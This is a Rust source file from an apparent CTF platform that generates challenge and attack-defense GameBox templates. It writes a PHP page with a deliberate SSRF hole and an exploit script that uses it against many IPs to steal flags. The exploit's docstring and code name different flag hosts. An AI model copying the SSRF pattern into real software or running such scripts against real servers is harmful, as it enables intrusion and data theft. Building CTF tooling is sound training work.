//! 元数据模板相关类型。

use anyhow::{Context, Result};

/// 生成 Challenge 模板目录（包清单 v1）。
pub fn generate_challenge_template(name: &str, output_dir: &str) -> Result<()> {
    use std::fs;
    use std::path::Path;

    let challenge_dir = Path::new(output_dir).join(name);
    fs::create_dir_all(&challenge_dir).context("Failed to create challenge directory")?;

    let src_dir = challenge_dir.join("src");
    fs::create_dir_all(&src_dir).context("Failed to create src directory")?;

    let attachment_dir = challenge_dir.join("attachment");
    fs::create_dir_all(&attachment_dir).context("Failed to create attachment directory")?;

    // attachment/note.txt — 附件示例（与 examples/test_c 同形态）
    fs::write(attachment_dir.join("note.txt"), "just test attachment")
        .context("Failed to write attachment/note.txt")?;

    // meta.toml (v1 manifest — strict deny_unknown_fields)
    let meta_content = format!(
        r#"name = "{name}"
version = "1.0.0"
author = "your_email@example.com" # modify
category = "web" # modify
description = "Challenge description" # modify

# Optional: 显式 safe_name；缺省由 name 派生（派生失败时必须显式提供）
# safe_name = "easy-web-01"

# Optional: 附件路径（必须位于 attachment/ 目录下）
attachment = "attachment/note.txt"

[flag]
type = "dynamic"
# type = "static"
# value = "flag{{}}"

[docker]
port = 80

[docker.recommended_resources]
cpu_millis = 500
memory_bytes = 268435456
pids_limit = 100
"#
    );
    fs::write(challenge_dir.join("meta.toml"), meta_content)
        .context("Failed to write meta.toml")?;

    // flag — placeholder for dynamic flags; the runtime overwrites it from FLAG.
    fs::write(src_dir.join("flag"), "flag{dynamic_placeholder}").context("Failed to write flag")?;

    // entrypoint.sh — writes FLAG to /flag then unsets it in the SAME shell
    // before exec, so the app can never read the real flag via getenv.
    fs::write(
        src_dir.join("entrypoint.sh"),
        r#"#!/bin/sh
set -eu

# FloatCTF dynamic flag runtime contract:
# 将 FLAG 写入 /flag 后，必须在最终 exec 的同一个 shell 中 unset，
# 防止应用进程通过 getenv / /proc/<pid>/environ 读取真实 FLAG。
if [ -n "${FLAG:-}" ]; then
    printf '%s\n' "$FLAG" > /flag
    unset FLAG
fi

exec "$@"
"#,
    )
    .context("Failed to write entrypoint.sh")?;

    // index.php
    fs::write(
        src_dir.join("index.php"),
        "<?php echo file_get_contents(\"/flag\"); ?>",
    )
    .context("Failed to write index.php")?;

    // Dockerfile (no flag.sh anymore — the flag write happens in entrypoint.sh)
    fs::write(
        src_dir.join("Dockerfile"),
        r#"FROM php:8.2-apache-bookworm
LABEL Author="your_name <your_email@example.com>"

COPY flag /flag
COPY entrypoint.sh /entrypoint.sh
COPY index.php /var/www/html/index.php
RUN chmod +x /entrypoint.sh

# 运行时端口契约来自 meta.toml [docker].port（EXPOSE 仅示意）
EXPOSE 80
WORKDIR /var/www/html

ENTRYPOINT ["/entrypoint.sh"]
CMD ["apache2-foreground"]
"#,
    )
    .context("Failed to write Dockerfile")?;

    Ok(())
}

fn gamebox_meta_toml(name: &str) -> String {
    format!(
        r#"name = "{name}"
version = "1.0.3"
author = "your_email"
category = "web"
description = "hello floatctf"
# optional: safe_name = "{slug}"

[gamebox]
username = "floatctf"

[[gamebox.healthchecks]]
type = "http"
port = 80
path = "/"
expected_status = 200

[judge]
check_script = "judge/check.py"

# optional: awdp
[awdp]
# zip file from docker image and provide the path to user
source_code_dir = "/var/www/html"
exploit_script = "awdp/exploit.py"

[gamebox.recommended_resources]
cpu_millis = 1000
memory_bytes = 536870912
pids_limit = 100
"#,
        name = name,
        slug = name.to_lowercase().replace(' ', "-"),
    )
}

fn write_judge_check_py(judge_dir: &std::path::Path) -> Result<()> {
    use std::fs;
    fs::create_dir_all(judge_dir).context("Failed to create judge directory")?;
    fs::write(
        judge_dir.join("check.py"),
        r#"#!/usr/bin/env python3
"""GameBox 批量健康检查（judge）。

Trusted by the platform; never baked into the Docker image.
支持一次传入多个 GameBox IP 并发检查。

用法:
    python judge/check.py ip1 ip2 ip3 ip4 ip5 ip6 ...

输出（JSON，stdout）:
    [{"success": true,  "gamebox_ip": "ip1"},
     {"success": false, "gamebox_ip": "ip2", "error": "..."},
     ...]

退出码: 全部成功 → 0；任一失败 → 1；用法错误（未传 IP）→ 2
"""
import json
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# 单次检查超时（秒）
CHECK_TIMEOUT_SECS = 10
# 并发检查上限
MAX_WORKERS = 32


def check(target_ip: str) -> dict:
    """检查单个 GameBox 的 HTTP 服务是否正常。"""
    result: dict = {"gamebox_ip": target_ip}
    try:
        with urllib.request.urlopen(
            f"http://{target_ip}/?url=http://127.0.0.1", timeout=CHECK_TIMEOUT_SECS
        ) as resp:
            if resp.status == 200:
                result["success"] = True
            else:
                result["success"] = False
                result["error"] = f"HTTP {resp.status}"
    except Exception as exc:  # 网络/超时/HTTP 错误
        result["success"] = False
        result["error"] = str(exc)
    return result


def main() -> int:
    ips = sys.argv[1:]
    if not ips:
        print(
            json.dumps(
                {"success": False, "error": "用法: python judge/check.py ip1 ip2 ip3 ..."}
            )
        )
        return 2

    with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(ips))) as pool:
        results = list(pool.map(check, ips))

    print(json.dumps(results, ensure_ascii=False))
    return 0 if all(r.get("success") for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
"#,
    )
    .context("Failed to write judge/check.py")?;
    Ok(())
}

fn write_awdp_exploit_py(awdp_dir: &std::path::Path) -> Result<()> {
    use std::fs;
    fs::create_dir_all(awdp_dir).context("Failed to create awdp directory")?;
    fs::write(
        awdp_dir.join("exploit.py"),
        r#"#!/usr/bin/env python3
"""test_g AWD 批量攻击脚本：利用 SSRF 漏洞获取各目标战队 GameBox 的 flag。

攻击原理
--------
1. test_g 的 `index.php` 存在 SSRF：`?url=<address>` 会令服务端 PHP curl 任意地址，
   响应原样回显。
2. 平台部署 GameBox 时通过 `extra_hosts` 注入 `flagserver` 主机名
   （指向本赛事 FlagServer），且攻击阶段防火墙放行 gamebox → flagserver。
3. FlagServer 的 `GET /flag` 按 TCP 源 IP 识别请求方 GameBox，返回该 GameBox
   当前轮次的确定性 flag（同 gamebox + 同 round = 同 flag）。
4. 因此让**目标 GameBox** 发起 `http://flagserver/flag` 请求，源 IP 即目标
   GameBox，FlagServer 返回目标战队的 flag，经 SSRF 回显给攻击者。

支持一次传入多个目标 GameBox IP 并发攻击。

用法
----
    python awdp/exploit.py ip1 ip2 ip3 ip4 ip5 ip6 ...

输出（JSON，stdout）
--------------------
    [{"success": true,  "gamebox_ip": "ip1", "flag": "flag{...}"},
     {"success": false, "gamebox_ip": "ip2", "error": "..."},
     ...]

退出码: 全部成功 → 0；任一失败 → 1；用法错误（未传 IP）→ 2
"""

import json
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# 单次攻击超时（秒）
EXPLOIT_TIMEOUT_SECS = 10
# 并发攻击上限
MAX_WORKERS = 32


def exploit(target_ip: str) -> dict:
    """向单个目标 GameBox 的 SSRF 端点发起攻击，返回结果字典。"""
    result: dict = {"gamebox_ip": target_ip}
    # SSRF：目标 GameBox 的 PHP 请求 flagserver/flag，
    # TCP 源 IP = 目标 GameBox → FlagServer 发放目标战队 flag。
    payload_url = f"http://{target_ip}/?url=http://judge-server/flag"
    try:
        with urllib.request.urlopen(payload_url, timeout=EXPLOIT_TIMEOUT_SECS) as resp:
            body = resp.read().decode("utf-8", errors="replace").strip()
    except Exception as exc:  # 网络/超时/HTTP 错误
        result["success"] = False
        result["error"] = str(exc)
        return result

    if body.startswith("flag{"):
        result["success"] = True
        result["flag"] = body
    else:
        result["success"] = False
        result["error"] = "未获取到 flag"
        result["body"] = body[:200]
    return result


def main() -> int:
    ips = sys.argv[1:]
    if not ips:
        print(
            json.dumps(
                {"success": False, "error": "用法: python awdp/exploit.py ip1 ip2 ip3 ..."}
            )
        )
        return 2

    with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(ips))) as pool:
        results = list(pool.map(exploit, ips))

    print(json.dumps(results, ensure_ascii=False))
    return 0 if all(r.get("success") for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
"#,
    )
    .context("Failed to write awdp/exploit.py")?;
    Ok(())
}

/// 生成 GameBox 模板目录（可移植包格式）。
pub fn generate_gamebox_template(name: &str, output_dir: &str) -> Result<()> {
    use std::fs;
    use std::path::Path;

    let gamebox_dir = Path::new(output_dir).join(name);
    fs::create_dir_all(&gamebox_dir).context("Failed to create gamebox directory")?;

    let src_dir = gamebox_dir.join("src");
    fs::create_dir_all(&src_dir).context("Failed to create src directory")?;

    fs::write(gamebox_dir.join("meta.toml"), gamebox_meta_toml(name))
        .context("Failed to write meta.toml")?;

    write_judge_check_py(&gamebox_dir.join("judge"))?;
    write_awdp_exploit_py(&gamebox_dir.join("awdp"))?;

    // Dockerfile — 自包含：php:8.2-apache + openssh-server，SSH 凭据来自 env 契约
    // (GAMEBOX_USERNAME / GAMEBOX_USERPASS，对齐 examples/test_g)。
    fs::write(
        src_dir.join("Dockerfile"),
        r#"FROM php:8.2-apache-bookworm

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        openssh-server \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd \
    && printf '%s\n' \
        'PasswordAuthentication yes' \
        'PermitRootLogin no' \
        > /etc/ssh/sshd_config.d/floatctf.conf

COPY index.php /var/www/html/index.php
COPY entrypoint.sh /entrypoint.sh

RUN chmod 0755 /entrypoint.sh

WORKDIR /var/www/html

EXPOSE 22 80

ENTRYPOINT ["/entrypoint.sh"]
CMD ["apache2-foreground"]
"#,
    )
    .context("Failed to write Dockerfile")?;

    // entrypoint.sh — GameBox 运行时契约：GAMEBOX_USERNAME / GAMEBOX_USERPASS
    fs::write(
        src_dir.join("entrypoint.sh"),
        r#"#!/usr/bin/env bash
set -Eeuo pipefail

# --------------------------------------------------
# FloatCTF GameBox Runtime Contract
# --------------------------------------------------

: "${GAMEBOX_USERNAME:?GAMEBOX_USERNAME is required}"
: "${GAMEBOX_USERPASS:?GAMEBOX_USERPASS is required}"

# username 必须是普通 Linux 用户名。
if [[ ! "$GAMEBOX_USERNAME" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]; then
    echo "[FloatCTF] invalid GAMEBOX_USERNAME" >&2
    exit 1
fi

# --------------------------------------------------
# Initialize SSH
# --------------------------------------------------

mkdir -p /run/sshd

# 首次启动容器时生成 SSH host keys。
ssh-keygen -A >/dev/null 2>&1

# 如果用户不存在则创建。
if ! id "$GAMEBOX_USERNAME" >/dev/null 2>&1; then
    useradd \
        --create-home \
        --shell /bin/bash \
        "$GAMEBOX_USERNAME"
fi

# 设置 GameBox 登录密码。
printf '%s:%s\n' \
    "$GAMEBOX_USERNAME" \
    "$GAMEBOX_USERPASS" \
    | chpasswd

# --------------------------------------------------
# Remove credentials from child process environment
# --------------------------------------------------

unset GAMEBOX_USERPASS
unset GAMEBOX_USERNAME

# --------------------------------------------------
# Start SSH
# --------------------------------------------------

/usr/sbin/sshd

# --------------------------------------------------
# Start challenge service
# --------------------------------------------------

exec "$@"
"#,
    )
    .context("Failed to write entrypoint.sh")?;

    // index.php
    fs::write(
        src_dir.join("index.php"),
        r#"<?php
// 获取用户输入的 URL
$url = $_GET['url'];
if (isset($url)) {
    // 1. 初始化 curl
    $ch = curl_init();

    // 2. 设置配置
    curl_setopt($ch, CURLOPT_URL, $url);           // 设置目标 URL
    curl_setopt($ch, CURLOPT_HEADER, 0);           // 不返回 header
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   // 将结果返回成字符串而非直接输出

    // 3. 执行请求
    $result = curl_exec($ch);

    // 4. 关闭连接并输出结果
    curl_close($ch);
    echo $result;
} else {
    echo "Please usage: ?url=http://cn.bing.com";
}
?>
"#,
    )
    .context("Failed to write index.php")?;

    Ok(())
}

/// 生成基础 GameBox 模板目录（AWD 基础镜像源）。
pub fn generate_gamebox_basic_template(name: &str, output_dir: &str) -> Result<()> {
    use std::fs;
    use std::path::Path;

    let gamebox_dir = Path::new(output_dir).join(name);
    fs::create_dir_all(&gamebox_dir).context("Failed to create gamebox directory")?;

    let src_dir = gamebox_dir.join("src");
    fs::create_dir_all(&src_dir).context("Failed to create src directory")?;

    // meta.toml — fixed identity for the awd-base package
    fs::write(
        gamebox_dir.join("meta.toml"),
        r#"name = "awd-base"
version = "1.0.0"
author = "fb0sh@outlook.com"
category = "web"
description = "awd-base"
safe_name = "awd-base"

[gamebox]
username = "floatctf"

[[gamebox.healthchecks]]
type = "http"
port = 80
path = "/"
expected_status = 200

[[gamebox.healthchecks]]
type = "tcp"
port = 22

[judge]
script = "judge/check.py"

[gamebox.recommended_resources]
cpu_millis = 1000
memory_bytes = 536870912
pids_limit = 100
"#,
    )
    .context("Failed to write meta.toml")?;

    write_judge_check_py(&gamebox_dir.join("judge"))?;

    // entrypoint.sh
    fs::write(
        src_dir.join("entrypoint.sh"),
        r#"#!/bin/bash
set -e

# 1. 动态同步账户 (根据 Bollard 传来的 ENV)
USERNAME=${GAMEBOX_USERNAME:-"floatctf"}
if [ "$USERNAME" != "floatctf" ]; then
    usermod -l "$USERNAME" floatctf || useradd -m -s /bin/bash "$USERNAME"
fi

# 2. 设置密码
if [ -n "$GAMEBOX_USERPASS" ]; then
    echo "$USERNAME:$GAMEBOX_USERPASS" | chpasswd
fi

# 3. 权限修正 (AWD 灵魂操作)
chown -R "$USERNAME":"$USERNAME" /var/www/html

# 4. 启动 Apache (后台) 并启动 SSH (前台接管)
rm -f /var/run/apache2/apache2.pid
service apache2 start

echo "[FloatCTF] Base Gamebox is UP. Good luck, hackers!"
exec "$@"
"#,
    )
    .context("Failed to write entrypoint.sh")?;

    // Dockerfile
    fs::write(
        src_dir.join("Dockerfile"),
        r#"# 基础镜像 slim
FROM ubuntu:24.04

# 避免交互式安装
ENV DEBIAN_FRONTEND=noninteractive
ENV NeedRestartPriority=0

# 更新源并安装 SSH + 基础工具
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server \
    sudo \
    curl \
    wget \
    vim \
    iproute2 \
    net-tools \
    git \
    bash-completion \
    iputils-ping \
    procps \
    apache2 \
    php \
    libapache2-mod-php \
    php-curl \
    watch \
    && rm -rf /var/lib/apt/lists/*

# 创建 SSH 数据目录
RUN mkdir /var/run/sshd

# 创建 ctf 用户并设置密码
RUN useradd -m -s /bin/bash floatctf

# SSH 配置：允许 ctf 用户密码登录，禁止 root 登录
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config

ENV APACHE_RUN_USER=www-data
ENV APACHE_RUN_GROUP=www-data
ENV APACHE_LOG_DIR=/var/log/apache2


COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
# 默认启动 SSH
CMD ["/usr/sbin/sshd", "-D"]
"#,
    )
    .context("Failed to write Dockerfile")?;

    Ok(())
}
